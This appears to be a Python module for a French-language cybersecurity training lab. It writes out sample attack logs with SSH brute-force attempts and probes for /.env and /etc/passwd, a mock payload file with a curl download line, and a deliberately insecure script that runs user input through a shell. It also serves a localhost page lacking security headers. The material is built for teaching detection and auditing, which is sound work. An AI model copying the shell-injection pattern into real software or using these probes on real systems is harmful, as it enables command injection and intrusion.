from __future__ import annotations

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

from .payloads import create_harmless_payload


SAMPLE_LOG = """Jan 10 10:00:01 lab sshd[100]: Failed password for invalid user admin from 192.168.56.20 port 51101 ssh2
Jan 10 10:00:03 lab sshd[101]: Failed password for invalid user admin from 192.168.56.20 port 51102 ssh2
Jan 10 10:00:05 lab sshd[102]: Failed password for root from 192.168.56.20 port 51103 ssh2
Jan 10 10:00:07 lab sshd[103]: Failed password for root from 192.168.56.20 port 51104 ssh2
Jan 10 10:00:09 lab sshd[104]: Failed password for student from 192.168.56.20 port 51105 ssh2
Jan 10 10:00:12 lab sshd[105]: Accepted password for student from 192.168.56.20 port 51106 ssh2
192.168.56.30 - - [10/Jan/2026:10:01:00 +0000] "GET /.env HTTP/1.1" 404 120
192.168.56.30 - - [10/Jan/2026:10:01:02 +0000] "GET /../../etc/passwd HTTP/1.1" 400 120
192.168.56.31 - - [10/Jan/2026:10:01:05 +0000] "GET /admin HTTP/1.1" 403 120
"""

SUSPICIOUS_PAYLOAD = """# Fichier pédagogique : ne pas exécuter
# Indicateurs à identifier : téléchargement, PowerShell et connexion réseau.
curl https://example.invalid/demo.bin
powershell -Command "Write-Output training"
# socket.connect(('127.0.0.1', 9999))
"""

INSECURE_SCRIPT = """# Script pédagogique volontairement dangereux : ne pas exécuter.
import subprocess

command = input("Commande : ")
subprocess.run(command, shell=True)
"""


def prepare_lab(root: Path) -> dict[str, Path]:
    root.mkdir(parents=True, exist_ok=True)
    log_path = root / "journal_suspect.log"
    payload_path = root / "payload_a_identifier.txt"
    script_path = root / "script_a_auditer.py"
    log_path.write_text(SAMPLE_LOG, encoding="utf-8")
    payload_path.write_text(SUSPICIOUS_PAYLOAD, encoding="utf-8")
    script_path.write_text(INSECURE_SCRIPT, encoding="utf-8")
    harmless_path = create_harmless_payload(root)
    return {
        "log": log_path,
        "payload": payload_path,
        "script": script_path,
        "harmless": harmless_path,
    }


class InsecureLabHandler(BaseHTTPRequestHandler):
    server_version = "CyberLab/1.0"

    def do_HEAD(self) -> None:
        self._respond(include_body=False)

    def do_GET(self) -> None:
        self._respond(include_body=True)

    def _respond(self, include_body: bool) -> None:
        body = (
            b"<html><body><h1>Cyber HTTP Lab</h1>"
            b"<p>Ce serveur omet volontairement plusieurs en-tetes de securite.</p>"
            b"</body></html>"
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if include_body:
            self.wfile.write(body)

    def log_message(self, format: str, *args: object) -> None:
        print(f"[HTTP LAB] {self.address_string()} - {format % args}")


def serve_lab(port: int = 8088) -> None:
    if port < 1024 or port > 65535:
        raise ValueError("Choisissez un port entre 1024 et 65535.")
    server = ThreadingHTTPServer(("127.0.0.1", port), InsecureLabHandler)
    print(f"Lab HTTP actif sur http://127.0.0.1:{port}")
    print("Dans un autre terminal : run.bat headers http://127.0.0.1:8088")
    print("Arrêt : Ctrl+C")
    try:
        server.serve_forever()
    finally:
        server.server_close()
